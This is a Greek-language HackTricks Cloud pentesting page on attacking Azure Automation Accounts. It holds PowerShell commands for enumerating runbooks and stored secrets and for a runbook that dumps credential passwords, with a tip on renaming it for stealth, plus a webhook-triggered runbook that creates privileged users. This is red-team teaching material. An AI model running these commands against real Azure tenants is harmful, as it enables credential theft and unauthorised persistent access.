# Az - Λογαριασμός Αυτοματισμού

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Βασικές Πληροφορίες

[Από τα έγγραφα:](https://learn.microsoft.com/en-us/azure/automation/overview) Το Azure Automation παρέχει έναν υπηρεσία αυτοματισμού βασισμένη στο cloud, ενημερώσεις λειτουργικού συστήματος και υπηρεσία διαμόρφωσης που υποστηρίζει συνεπή διαχείριση σε όλα τα περιβάλλοντά σας στο Azure και μη-Azure. Περιλαμβάνει αυτοματισμό διαδικασιών, διαχείριση διαμόρφωσης, διαχείριση ενημερώσεων, κοινές δυνατότητες και διαφορετικά χαρακτηριστικά.

Αυτά είναι σαν τα "**προγραμματισμένα έργα**" στο Azure που θα σας επιτρέψουν να εκτελέσετε πράγματα (ενέργειες ή ακόμα και scripts) για να **διαχειριστείτε**, ελέγξετε και διαμορφώσετε το **περιβάλλον Azure**.

### Λογαριασμός Εκτέλεσης

Όταν χρησιμοποιείται ο **Λογαριασμός Εκτέλεσης**, δημιουργεί ένα **application Azure AD** με αυτο-υπογεγραμμένο πιστοποιητικό, δημιουργεί ένα **service principal** και αναθέτει τον ρόλο **Contributor** για τον λογαριασμό στην **τρέχουσα συνδρομή** (πολλά προνόμια).\
Η Microsoft συνιστά τη χρήση **Ταυτότητας που Διαχειρίζεται** για τον Λογαριασμό Αυτοματισμού.

{% hint style="warning" %}
Αυτό θα **αφαιρεθεί στις 30 Σεπτεμβρίου 2023 και θα αλλαχθεί με Διαχειριζόμενες Ταυτότητες.
{% endhint %}

## Runbooks & Jobs

Τα **Runbooks** σάς επιτρέπουν να **εκτελέσετε αυθαίρετο κώδικα PowerShell**. Αυτό θα μπορούσε να **καταχραστεί από έναν εισβολέα** για να κλέψει τα δικαιώματα του **συνδεδεμένου πρωτεύοντος** (αν υπάρχει).\
Στον **κώδικα** των **Runbooks** μπορείτε επίσης να βρείτε **ευαίσθητες πληροφορίες** (όπως διαπιστευτήρια).

Αν μπορείτε να **διαβάσετε** τα **έργα**, κάντε το καθώς περιέχουν την **έξοδο** της εκτέλεσης (πιθανές **ευαίσθητες πληροφορίες**).

Μεταβείτε στα `Λογαριασμοί Αυτοματισμού` --> `<Επιλογή Λογαριασμού Αυτοματισμού>` --> `Runbooks/Εργασίες/Ομάδες υπολογιστών Hybrid/Εργασίες παρακολούθησης/διαπιστευτήρια/μεταβλητές/πιστοποιητικά/συνδέσεις`

### Υπολογιστής Hybrid

Ένα Runbook μπορεί να εκτελεστεί σε ένα **container μέσα στο Azure** ή σε έναν **Υπολογιστή Hybrid** (μη-azure μηχάνημα).\
Ο πράκτορας **Log Analytics** εγκαθίσταται στο VM για να τον καταχωρίσει ως υβριδικό υπολογιστή.\
Οι εργασίες υβριδικού υπολογιστή εκτελούνται ως **SYSTEM** στα Windows και ως λογαριασμός **nxautomation** στο Linux.\
Κάθε Υπολογιστής Hybrid είναι καταχωρημένος σε μια **Ομάδα Υπολογιστών Hybrid**.

Επομένως, αν μπορείτε να επιλέξετε να εκτελέσετε ένα **Runbook** σε έναν **Υπολογιστή Hybrid Windows**, θα εκτελέσετε **αυθαίρετες εντολές** μέσα σε ένα εξωτερικό μηχάνημα ως **System** (καλή τεχνική pivot). 

## Κατάσταση Συμβιβασμού Διαμόρφωσης (SC)

[Από τα έγγραφα:](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview) Η Κατάσταση Συμβιβασμού Azure Automation είναι μια υπηρεσία διαχείρισης διαμόρφωσης Azure που σάς επιτρέπει να γράψετε, να διαχειριστείτε και να συντάξετε Διαμορφώσεις Επιθυμητής Κατάστασης PowerShell (DSC) [configurations](https://learn.microsoft.com/en-us/powershell/dsc/configurations/configurations) για κόμβους σε οποιονδήποτε νέφος ή κέντρο δεδομένων on-premises. Η υπηρεσία εισάγει επίσης [Πόρους DSC](https://learn.microsoft.com/en-us/powershell/dsc/resources/resources) και αναθέτει διαμορφώσεις σε στόχους κόμβους, όλα στο cloud. Μπορείτε να έχετε πρόσβαση στην Κατάσταση Συμβιβασμού Azure Automation στο portal Azure επιλέγοντας **Κατάσταση διαμόρφωσης (DSC)** κάτω από **Διαχείριση διαμόρφωσης**.

**Ευαίσθητες πληροφορίες** θα μπορούσαν να βρεθούν σε αυτές τις διαμορφώσεις.

### RCE

Είναι δυνατόν να καταχραστείτε την SC για να εκτελέσετε αυθαίρετα scripts στις διαχειριζόμενες μηχανές.

{% content-ref url="az-state-configuration-rce.md" %}
[az-state-configuration-rce.md](az-state-configuration-rce.md)
{% endcontent-ref %}

## Απαρίθμηση

{% code overflow="wrap" %}
```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group

# Gets Azure Automation accounts in a resource group
Get-AzAutomationAccount

# List & get DSC configs
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match '<name>'} | Export-AzAutomationDscConfiguration -OutputFolder . -Debug
## Automation Accounts named SecurityBaselineConfigurationWS... are there by default (not interesting)

# List & get Run books code
Get-AzAutomationAccount | Get-AzAutomationRunbook
Get-AzAutomationAccount | Get-AzAutomationRunbook | Export-AzAutomationRunbook -OutputFolder /tmp

# List credentials & variables & others
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationVariable
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationSchedule
Get-AzAutomationAccount | Get-AzAutomationModule
Get-AzAutomationAccount | Get-AzAutomationPython3Package
## Exfiltrate credentials & variables and the other info loading them in a Runbook and printing them

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```
{% endcode %}

### Δημιουργία ενός Runbook

{% code overflow="wrap" %}
```powershell
# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# Create a Powershell Runbook
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```
{% endcode %}

### Εξωθείτε διαπιστευτήρια & Μεταβλητές που έχουν οριστεί σε έναν λογαριασμό Αυτοματισμού χρησιμοποιώντας ένα Run Book

{% code overflow="wrap" %}
```powershell
# Change the crdentials & variables names and add as many as you need
@'
$creds = Get-AutomationPSCredential -Name <credentials_name>
$runbook_variable = Get-AutomationVariable -name <variable_name>
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password
'@ | out-file -encoding ascii 'runbook_get_creds.ps1'

$ResourceGroupName = '<resource_group_name>'
$AutomationAccountName = '<auto_acc_name>'
$RunBookName = 'Exif-Credentials' #Change this for stealthness

# Creare Run book, publish, start, and get output
New-AzAutomationRunBook -name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell
Import-AzAutomationRunBook -Path 'runbook_get_creds.ps1' -Name $RunBookName -Type PowerShell -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Force
Publish-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
$start = Start-AzAutomationRunBook -Name $RunBookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
start-sleep 20
($start | Get-AzAutomationJob | Get-AzAutomationJobOutput).Summarynt
```
{% endcode %}

{% hint style="info" %}
Μπορείτε να κάνετε το ίδιο πράγμα τροποποιώντας ένα υπάρχον Run Book, και μέσω της web κονσόλας.
{% endhint %}

### Βήματα για τη Δημιουργία Αυτοματοποιημένης Δημιουργίας Χρήστη με Υψηλά Προνομιούχο Ρόλο

#### 1. Αρχικοποίηση ενός Λογαριασμού Αυτοματοποίησης
- **Απαιτούμενη Ενέργεια:** Δημιουργήστε έναν νέο Λογαριασμό Αυτοματοποίησης.
- **Συγκεκριμένη Ρύθμιση:** Βεβαιωθείτε ότι το "Δημιουργία λογαριασμού Azure Run As" είναι ενεργοποιημένο.

#### 2. Εισαγωγή και Ρύθμιση Runbook
- **Πηγή:** Κατεβάστε το δείγμα runbook από το [Αποθετήριο GitHub του MicroBurst](https://github.com/NetSPI/MicroBurst).
- **Απαιτούμενες Ενέργειες:**
- Εισαγάγετε το runbook στον Λογαριασμό Αυτοματοποίησης.
- Δημοσιεύστε το runbook για να γίνει εκτελέσιμο.
- Συνδέστε ένα webhook στο runbook, ενεργοποιώντας εξωτερικές εναλλαγές.

#### 3. Ρύθμιση Ενότητας AzureAD
- **Απαιτούμενη Ενέργεια:** Προσθέστε την ενότητα AzureAD στον Λογαριασμό Αυτοματοποίησης.
- **Επιπλέον Βήμα:** Βεβαιωθείτε ότι όλες οι Ενότητες Αυτοματοποίησης Azure είναι ενημερωμένες στις τελευταίες τους εκδόσεις.

#### 4. Ανάθεση Δικαιωμάτων
- **Ρόλοι προς Ανάθεση:**
- Διαχειριστής Χρηστών
- Κάτοχος Συνδρομής
- **Στόχος:** Αναθέστε αυτούς τους ρόλους στον Λογαριασμό Αυτοματοποίησης για τα απαραίτητα προνόμια.

#### 5. Ενημέρωση για Πιθανή Απώλεια Πρόσβασης
- **Σημείωση:** Να είστε ενήμεροι ότι η ρύθμιση μιας τέτοιας αυτοματοποίησης μπορεί να οδηγήσει στην απώλεια ελέγχου επί της συνδρομής.

#### 6. Ενεργοποίηση Δημιουργίας Χρήστη
- Ενεργοποιήστε το webhook για τη δημιουργία ενός νέου χρήστη με την αποστολή ενός αιτήματος POST.
- Χρησιμοποιήστε το σενάριο PowerShell που παρέχεται, βεβαιωθείτε ότι αντικαθιστάτε το `$uri` με το πραγματικό URL του webhook σας και ενημερώνετε το `$AccountInfo` με το επιθυμητό όνομα χρήστη και κωδικό πρόσβασης.
```powershell
$uri = "<YOUR_WEBHOOK_URL>"
$AccountInfo  = @(@{RequestBody=@{Username="<DESIRED_USERNAME>";Password="<DESIRED_PASSWORD>"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```
## Αναφορές

* [https://learn.microsoft.com/en-us/azure/automation/overview](https://learn.microsoft.com/en-us/azure/automation/overview)
* [https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview)
* [https://github.com/rootsecdev/Azure-Red-Team#runbook-automation](https://github.com/rootsecdev/Azure-Red-Team#runbook-automation)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε hacking tricks υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
